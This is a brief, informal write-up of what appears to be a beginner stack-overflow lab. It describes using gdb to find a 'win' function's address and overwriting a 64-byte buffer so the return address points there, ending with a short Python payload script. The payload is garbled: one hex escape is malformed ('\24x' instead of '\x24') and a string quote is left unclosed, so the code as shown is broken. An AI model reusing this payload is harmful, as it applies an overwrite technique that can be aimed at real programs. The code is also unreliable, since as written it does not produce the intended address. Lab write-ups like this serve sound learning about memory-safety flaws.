This one is like the first one but ovewritting an address

The steps are the same:
1) Open gbd, do reasearch stuff (inf ways to do that)
2) Find the address of win function
3) Overwrite the 64bytes buffer and append the address of win (in litle endian)
4) End !

I ve used that python script

padding = "A"*64
padding += "\24x\x84\x04\x08
print padding

# where the address to append is 0x08048424 but reversed to match little endian
